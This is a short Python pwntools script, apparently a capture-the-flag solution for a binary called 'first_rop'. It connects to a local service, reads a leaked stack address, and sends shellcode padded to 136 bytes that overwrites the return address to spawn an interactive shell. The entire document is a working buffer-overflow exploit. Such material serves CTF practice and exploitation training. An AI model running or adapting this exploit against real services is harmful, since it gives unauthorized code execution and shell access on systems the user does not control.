#!/usr/bin/python2
from pwn import *

context.binary = ELF('./public/first_rop')
p = remote("localhost", 15002)
#p = process("./public/first_rop")

p.recvuntil("(")
ret = int(p.recvuntil(")", drop=True), 16)

shellcode = asm(shellcraft.sh())
PAYLOAD = shellcode + 'A'*(136-len(shellcode)) + p64(ret)
p.sendline(PAYLOAD)

p.interactive()